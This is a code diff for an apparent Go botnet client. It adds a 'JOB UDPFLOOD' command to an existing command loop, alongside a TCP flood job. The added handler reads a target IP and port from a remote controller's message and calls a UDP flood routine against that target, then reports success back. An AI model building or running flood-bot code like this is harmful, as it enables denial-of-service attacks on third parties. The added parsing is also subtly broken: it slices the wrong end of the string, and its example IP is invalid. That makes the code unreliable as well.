@@ -49,6 +49,10 @@ func main() {
 			conn.Write([]byte("ACPT JOB TCPFLOOD\r\n"))
 			fmt.Println("received:", result)
 			state = 3
+		} else if state == 2 && cleanedResult == "JOB UDPFLOOD" {
+			conn.Write([]byte("ACPT JOB UDPFLOOD\r\n"))
+			fmt.Println("received:", result)
+			state = 3
 		} else if state == 3 && cleanedResult[:7] == "JOB EQN" {
 			fmt.Println("[", cleanedResult[8:], "]")
 			expression, err := govaluate.NewEvaluableExpression(cleanedResult[8:])
@@ -73,6 +77,16 @@ func main() {
 			port, _ := strconv.Atoi(splits[1])
 
 			jobs.TCPFlood(splits[0], port)
+
+			conn.Write([]byte("JOB SUCC \r\n"))
+			state = 4
+		} else if state == 3 && cleanedResult[:12] == "JOB UDPFLOOD" {
+			// splits after JOB UDPFLOOD
+			// eg JOB UDPFLOOD 123.321.543.345 14 -> ["123.321.543.345", "14"]
+			splits := strings.Split(cleanedResult[:13], " ")
+			port, _ := strconv.Atoi(splits[1])
+
+			jobs.UDPFlood(splits[0], port)
 
 			conn.Write([]byte("JOB SUCC \r\n"))
 			state = 4
